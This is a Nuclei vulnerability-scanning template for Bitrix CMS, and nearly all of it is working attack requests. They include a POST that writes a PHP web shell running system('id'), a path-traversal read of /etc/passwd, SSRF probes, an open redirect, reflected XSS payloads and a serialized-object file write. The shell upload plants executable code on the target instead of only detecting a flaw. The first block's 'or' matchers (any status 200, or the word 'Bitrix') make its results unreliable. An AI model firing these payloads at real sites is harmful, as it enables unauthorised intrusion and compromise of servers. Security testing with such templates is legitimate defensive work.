author: clevergod
id: bitrix-ultimate-checks
info:
  author: securixy
  description: Comprehensive Nuclei template covering multiple Bitrix issues (XSS,
    SSRF, LFD, RCE, Spoofing, Object Injection, Registration Abuse, etc.)
  name: Bitrix Ultimate Vulnerability Checks
  severity: medium
  tags: bitrix,xss,ssrf,lfd,rce,spoofing,object-injection
requests:
- matchers:
  - type: word
    words:
    - bitrix_sessid
    - templateCachedData
    - Include Time
    - <a href="/*">*/%29%7D%29
    - Access denied
    - Redirecting to https://clevergod.net
    - Bitrix
    - REGISTER
  - status:
    - 200
    type: status
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/bitrix/tools/imagepg.php?img=//interesnyefakty.org/wp-content/uploads/chto-takoe-fishing.jpg'
  - '{{BaseURL}}/bitrix/modules/updater.log'
  - '{{BaseURL}}/bitrix/tools/ajax_bitrix_sessid_get.php'
  - '{{BaseURL}}/bitrix/components/bitrix/mobileapp.list/ajax.php/?AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&items%5BITEMS%5D%5BID%5D=<a+href="/*">*/%29%7D%29;function+__MobileAppList()%7Balert(1)%7D//>'
  - '{{BaseURL}}/bitrix/redirect.php?event1=&event2=&event3=&goto=https://clevergod.net'
  - '{{BaseURL}}/auth/?register=yes'
  - '{{BaseURL}}/crm/?register=yes'
  - '{{BaseURL}}/auth/oauth2/?register=yes'
  - '{{BaseURL}}/bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php?register=yes'
  - '{{BaseURL}}/bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/custom-registration/index.php?register=yes'
  - '{{BaseURL}}/bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php?register=yes'
  - '{{BaseURL}}/bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/public/ru/board/my/index.php?register=yes'
- body: sessid=123456789&action=save_file&path=/upload/test.php&content=<?php echo
    md5(1337); ?>
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - success
  method: POST
  path:
  - '{{BaseURL}}/bitrix/tools/html_editor_action.php'
- body: action=get_url_preview&url=http://127.0.0.1
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - 127.0.0.1
  method: POST
  path:
  - '{{BaseURL}}/bitrix/tools/html_editor_action.php'
- body: action=save_file&path=/upload/shell.php&content=<?php system("id"); ?>
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - success
  method: POST
  path:
  - '{{BaseURL}}/bitrix/tools/html_editor_action.php'
- body: action=check&site=http://127.0.0.1
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - 127.0.0.1
  method: POST
  path:
  - '{{BaseURL}}/bitrix/tools/site_checker.php'
- body: action=save_file&path=/upload/bitrix_test.php&content=O:8:"stdClass":0:{}
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - type: word
    words:
    - stdClass
  method: POST
  path:
  - '{{BaseURL}}/bitrix/tools/html_editor_action.php'
- matchers:
  - type: word
    words:
    - 'root:'
  method: GET
  path:
  - '{{BaseURL}}/bitrix/tools/virtual_file_system.php?path=/etc/passwd'
- matchers:
  - type: word
    words:
    - <script>alert(document.domain)</script>
  method: GET
  path:
  - '{{BaseURL}}/bitrix/components/bitrix/map.google.view/ajax.php?bxajaxid=1&lang=en&site_id=s1&mapId=a<script>alert(document.domain)</script>'
- matchers:
  - type: word
    words:
    - <script>alert(1)</script>
  method: GET
  path:
  - '{{BaseURL}}/bitrix/components/bitrix/photogallery_user/ajax.php?user_id=<script>alert(1)</script>'
